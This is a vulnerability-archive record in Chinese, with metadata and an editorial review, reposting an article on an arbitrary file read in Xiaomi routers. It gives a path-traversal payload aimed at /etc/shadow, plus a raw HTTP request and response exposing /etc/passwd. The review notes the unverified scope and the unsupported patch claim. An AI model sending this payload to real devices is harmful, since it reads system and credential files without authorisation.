---
version: "小米 路由器"
source: "MrWQ/vulnerability-paper"
id: "vw-9e0182892e1a4404f55dbc9d"
entity_id: "ve-9e0182892e1a4404f55dbc9d"
schema_version: "1"
title: "小米 路由器 extdisks 任意文件读取漏洞"
product: "小米路由器型号未知"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie，实示/etc/passwd；固件未列"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%B0%8F%E7%B1%B3%20%E8%B7%AF%E7%94%B1%E5%99%A8%20extdisks%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/Nn47qKEDQTQ7MnxUMP1z-w"
source_status: "recorded"
---

# 小米 路由器 extdisks 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：小米路由器型号未知
- 本文讨论：api-third-party/download/extdisks前缀穿越读取
- 版本、权限与配置前提：无Cookie，实示/etc/passwd；固件未列
- 资料类型：目录穿越PoC及响应；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 具体型号/固件缺失；销售WiFi代际介绍不能代替影响范围
- payload写shadow但请求和响应为passwd，不能据passwd证明shadow权限
- 声称补丁已发只链接商城主页，没有版本或公告
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 机型/固件、Nginx配置与shadow读取范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Nn47qKEDQTQ7MnxUMP1z-w)

**本文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。**

**漏洞说明**

小米路由器是小米公司推出的一款智能路由器，它采用了全新的天线设计方案，4 根外置全向多振子高增益天线将 2.4GHz 和 5GHz 的天线独立开来，同时针对不同频段的特性进行特殊优化，WiFi 信号更强。小米路由器现在在售的数量款式不多，其中 WIFI5 路由器 2 款：Redmi AC2100 和小米 AC2100, 其余全部是 WIFI6 路由器。

小米 路由器存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器敏感信息

**影响版本**

```
小米 路由器

```

漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUEibicEdnok5YnKC2ewdxTn6M75xhRPxcfqf2F4Ryubrcs1MXiblRvgUBRQnpUqbXpgcESNiabRfqCkQ/640?wx_fmt=png)

payload：

```
/api-third-party/download/extdisks../etc/shadow

```

请求包：

```http
GET /api-third-party/download/extdisks../etc/passwd HTTP/1.1
Host: IP:PORT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

响应包：  

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 02 Jul 2023 23:46:22 GMT
Content-Type: application/octet-stream
Content-Length: 190
Last-Modified: Tue, 11 Sep 2018 10:06:47 GMT
Connection: close
ETag: "5b9793b7-be"
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-cache
....
Accept-Ranges: bytes
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXX1S8Cos228ay1hib0OLD27f8XlBKHVfg3iasqtfhptvOjfLbRwUMRjLuX48KTx30V9GF7Wv4lsRFg/640?wx_fmt=png)

**修复建议**  

目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：

https://www.mi.com

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
